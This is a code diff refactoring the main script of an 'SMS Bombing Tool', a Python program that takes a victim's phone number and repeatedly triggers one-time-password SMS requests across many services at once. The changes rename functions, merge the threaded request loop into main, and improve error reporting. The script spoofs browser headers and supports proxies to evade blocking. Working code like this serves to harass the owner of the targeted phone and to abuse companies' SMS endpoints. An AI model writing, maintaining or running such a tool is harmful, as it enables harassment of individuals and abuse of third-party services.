@@ -12,9 +12,9 @@ from fake_headers import Headers
 from api import send_otp_requests
 
 
-def init():
+def parse_arguments():
     """
-    Initialize the SMS bombing tool with command-line arguments.
+    Parse command-line arguments.
     """
     parser = argparse.ArgumentParser(description="SMS Bombing Tool")
     parser.add_argument("target", help="The target phone number")
@@ -46,18 +46,7 @@ def init():
 
     args = parser.parse_args()
 
-    phone_number = args.target
-    bombing_times = args.count
-    thread_num = args.threads
-    verbose_level = args.verbose
-    proxy = args.proxy
-
-    proxy_dict = {"http": proxy, "https": proxy} if proxy else None
-
-    if proxy:
-        print(f"Using proxy: {proxy}")
-
-    return phone_number, bombing_times, thread_num, verbose_level, proxy_dict
+    return args.target, args.count, args.threads, args.verbose, args.proxy
 
 
 def send_request(api_name, api_url, data, timeout, proxy=None):
@@ -67,6 +56,7 @@ def send_request(api_name, api_url, data, timeout, proxy=None):
     headers = Headers()
     generated_headers = headers.generate()
     current_time = datetime.now().strftime("%H:%M:%S")
+    response = None
 
     try:
         response = requests.post(
@@ -79,11 +69,9 @@ def send_request(api_name, api_url, data, timeout, proxy=None):
         response.raise_for_status()
 
         return f"{Fore.YELLOW}[{current_time}] {Fore.GREEN}[Success] {api_name} =>{Style.RESET_ALL} OK"
-    except requests.exceptions.RequestException:
-        error_code = (
-            response.status_code if hasattr(response, "status_code") else "Unknown"
-        )
-        return f"{Fore.YELLOW}[{current_time}] {Fore.RED}[Failed] {api_name} =>{Style.RESET_ALL} Error {error_code}"
+    except requests.exceptions.RequestException as e:
+        error_code = response.status_code if response else "Unknown"
+        return f"{Fore.YELLOW}[{current_time}] {Fore.RED}[Failed] {api_name} =>{Style.RESET_ALL} Error {error_code}: {e}"
 
 
 def process_target(api, proxy):
@@ -93,7 +81,7 @@ def process_target(api, proxy):
     return send_request(api["name"], api["url"], api["data"], timeout=5, proxy=proxy)
 
 
-def sigint_handler(signal, frame):
+def handle_sigint(signal, frame):
     """
     Handle SIGINT signal.
     """
@@ -101,29 +89,7 @@ def sigint_handler(signal, frame):
     _exit(1)
 
 
-def progress_bar(bombing_times, apis, process_num, proxy_dict, verbose_level):
-    """
-    Display progress bar and send requests concurrently.
-    """
-    with alive_bar(bombing_times * len(apis), theme="smooth") as progress_bar:
-        with concurrent.futures.ThreadPoolExecutor(max_workers=process_num) as executor:
-            futures = [
-                executor.submit(process_target, api, proxy_dict)
-                for api in apis * bombing_times
-            ]
-
-            for future in concurrent.futures.as_completed(futures):
-                progress_bar()
-                result = future.result()
-                if verbose_level:
-                    if "OK" in result:
-                        print(f"{Fore.GREEN}{result}{Style.RESET_ALL}")
-                    else:
-                        print(f"{Fore.RED}{result}{Style.RESET_ALL}")
-    print_results(futures)
-
-
-def print_results(futures):
+def display_results(futures):
     """
     Print results of the bombing process.
     """
@@ -141,10 +107,31 @@ def main():
     """
     Main function to run the SMS bombing tool.
     """
-    signal.signal(signal.SIGINT, sigint_handler)
-    phone_number, bombing_times, process_num, verbose_level, proxy_dict = init()
-    apis = send_otp_requests(phone_number)
-    progress_bar(bombing_times, apis, process_num, proxy_dict, verbose_level)
+    signal.signal(signal.SIGINT, handle_sigint)
+    target, count, threads, verbose, proxy = parse_arguments()
+    proxy_dict = {"http": proxy, "https": proxy} if proxy else None
+
+    if proxy:
+        print(f"Using proxy: {proxy}")
+
+    apis = send_otp_requests(target)
+
+    with alive_bar(count * len(apis), theme="smooth") as progress_bar:
+        with concurrent.futures.ThreadPoolExecutor(max_workers=threads) as executor:
+            futures = [
+                executor.submit(process_target, api, proxy_dict) for api in apis * count
+            ]
+
+            for future in concurrent.futures.as_completed(futures):
+                progress_bar()
+                result = future.result()
+                if verbose:
+                    if "OK" in result:
+                        print(f"{Fore.GREEN}{result}{Style.RESET_ALL}")
+                    else:
+                        print(f"{Fore.RED}{result}{Style.RESET_ALL}")
+
+    display_results(futures)
 
 
 if __name__ == "__main__":
